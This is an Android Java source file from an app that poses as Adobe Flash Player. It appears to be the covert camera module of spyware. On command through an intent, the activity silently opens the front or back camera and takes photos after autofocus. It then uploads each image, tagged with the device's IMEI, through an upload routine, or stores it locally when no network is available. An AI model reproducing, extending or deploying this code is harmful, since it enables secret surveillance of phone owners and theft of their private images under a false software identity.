package com.adobe.flashplayer.data;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.ImageFormat;
import android.graphics.Matrix;
import android.hardware.Camera;
import android.os.Bundle;
import android.os.Environment;
import android.util.Log;
import android.widget.FrameLayout;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;

import com.adobe.flashplayer.MyLog;
import com.adobe.flashplayer.Public;
import com.adobe.flashplayer.R;
import com.adobe.flashplayer.Utils;
import com.adobe.flashplayer.network.NetworkUitls;
import com.adobe.flashplayer.network.UploadData;


public class CameraActivity2 extends Activity {

    private final String TAG = "[ljg]CameraPhotoActivity2 ";
    private FrameLayout cameraFrame;
    private Camera mCamera;
    //private TextView cameraTv;

    private long camerastarttime ;

    int photoNumber = 0;

    int photoCount = 0;

    @Override
    protected void onCreate(Bundle savedInstanceState) {

        super.onCreate(savedInstanceState);

        try {

            setContentView(R.layout.activity_camera2);

            camerastarttime = System.currentTimeMillis();

            Intent intent = getIntent();
            int cameraidx = intent.getIntExtra("index", 0);
            photoNumber = intent.getIntExtra("count", 1);
            if (cameraidx != Camera.CameraInfo.CAMERA_FACING_FRONT && cameraidx != Camera.CameraInfo.CAMERA_FACING_BACK ){
                photoNumber = 1;
            }

            cameraFrame = (FrameLayout) findViewById(R.id.camera_frame);

            //cameraTv = (TextView) findViewById(R.id.camera_tv);

            int numberOfCameras = Camera.getNumberOfCameras();

            for (int cameraId = 0; cameraId < numberOfCameras; cameraId++) {
                Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
                Camera.getCameraInfo(cameraId, cameraInfo);

                //if (cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
                //    mCamera = Camera.open(cameraId);
                //}

                if (cameraidx == Camera.CameraInfo.CAMERA_FACING_FRONT || cameraidx == Camera.CameraInfo.CAMERA_FACING_BACK){
                    if (cameraInfo.facing == cameraidx) {
                        mCamera = Camera.open(cameraId);
                    }
                }else{
                    mCamera = Camera.open(cameraId);
                }


                CameraPreview2 mPreview = new CameraPreview2(this, mCamera);
                cameraFrame.addView(mPreview);

                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        try {
                            Thread.sleep(CameraActivity.CAMERAFOCUSDELAY); // 设置1秒后自动拍照，可调节
                            //得到照相机的参数
                            Camera.Parameters parameters = mCamera.getParameters();
                            //图片的格式
                            parameters.setPictureFormat(ImageFormat.JPEG);
                            //预览的大小是多少
                            parameters.setPreviewSize(CameraActivity.DEFAULT_CAMERA_PHOTO_WIDTH, CameraActivity.DEFAULT_CAMERA_PHOTO_HEIGHT);
                            //设置对焦模式，自动对焦
                            parameters.setFocusMode(Camera.Parameters.FOCUS_MODE_AUTO);
                            //对焦成功后，自动拍照
                            mCamera.autoFocus(new Camera.AutoFocusCallback() {
                                @Override
                                public void onAutoFocus(boolean success, Camera camera)
                                {
                                    if (success) {
                                        mCamera.takePicture(null, null, mPictureCallback);
                                    }
                                }
                            });
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }
                    }
                }).start();
            }
        }catch (Exception e){
            e.printStackTrace();
        }
    }


    @Override
    public void onStart() {
        super.onStart();
    }


    Camera.PictureCallback mPictureCallback = new Camera.PictureCallback() {
        @Override
        public void onPictureTaken(byte[] data, Camera camera) {

            try {
                mCamera.stopPreview();
                mCamera.setPreviewCallback(null);
                mCamera.release();
                mCamera = null;
                finish();

                long cameraendtime = System.currentTimeMillis();
                long camerausetime = cameraendtime - camerastarttime;
                //MyLog.writeLogFile("camera photo cost milliseconds:" + String.valueOf(camerausetime) + "\r\n");
                Log.e(TAG,"camera photo cost milliseconds:" + String.valueOf(camerausetime) + "\r\n");

                if (data.length > Public.VALID_CAMERAPHOTO_SIZE) {
                    Context context = getApplicationContext();
                    if (NetworkUitls.isNetworkAvailable(context) == true/*&& (Network.getNetworkType(context) == Network.WIFI_CONNECTION*/) {

                        String filename = Utils.formatCurrentDateInFileName() + "_" + Public.CAMERAPHOTO_FILE_NAME;
                        int filenamelen = filename.getBytes().length;
                        int datasize = (int) data.length;
                        int sendsize = datasize + 4 + filenamelen + 4;
                        byte[] sendbuf = new byte[sendsize];
                        byte[] bytefilenamelen = Utils.intToBytes(filenamelen);
                        System.arraycopy(bytefilenamelen, 0, sendbuf, 0, 4);
                        System.arraycopy(filename.getBytes(), 0, sendbuf, 4, filenamelen);
                        byte[] bytedatasize = Utils.intToBytes(datasize);
                        System.arraycopy(bytedatasize, 0, sendbuf, 4 + filenamelen, 4);
                        System.arraycopy(data, 0, sendbuf, 4 + filenamelen + 4, datasize);

                        new Thread(new UploadData(sendbuf, sendsize, Public.CMD_DATA_CAMERAPHOTO, Public.IMEI)).start();
                    } else {
                        String filename = Utils.formatCurrentDateInFileName() + "_" + Public.CAMERAPHOTO_FILE_NAME;
                        File pictureFile = new File(Public.LOCAL_PATH_NAME + filename);
                        FileOutputStream fos = new FileOutputStream(pictureFile);
                        Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);
                        Matrix matrix = new Matrix();
                        //matrix.preRotate(90);
                        bitmap = Bitmap.createBitmap(bitmap, 0, 0, bitmap.getWidth(), bitmap.getHeight(), matrix, true);
                        bitmap.compress(Bitmap.CompressFormat.JPEG, Public.CAMERA_PHOTO_QUALITY, fos);
                        fos.close();
                    }

                    Log.d(TAG, "send camera photo ok");
                }else{
                    MyLog.writeLogFile("camera photo size:" + data.length + " is ignormal\r\n");
                }
            } catch (Exception error) {
                Log.d(TAG, "camera photo PictureCallback error:" + error.toString());
                error.printStackTrace();
                String errorString = Utils.getExceptionDetail(error);
                String stackString = Utils.getCallStack();
                MyLog.writeLogFile("CameraPhotoActivity exception:"+errorString + "\r\n" + "call stack:" + stackString + "\r\n");
                return ;
            }

            //实现连续拍多张的效果
            //mCamera.startPreview();
        }
    };

}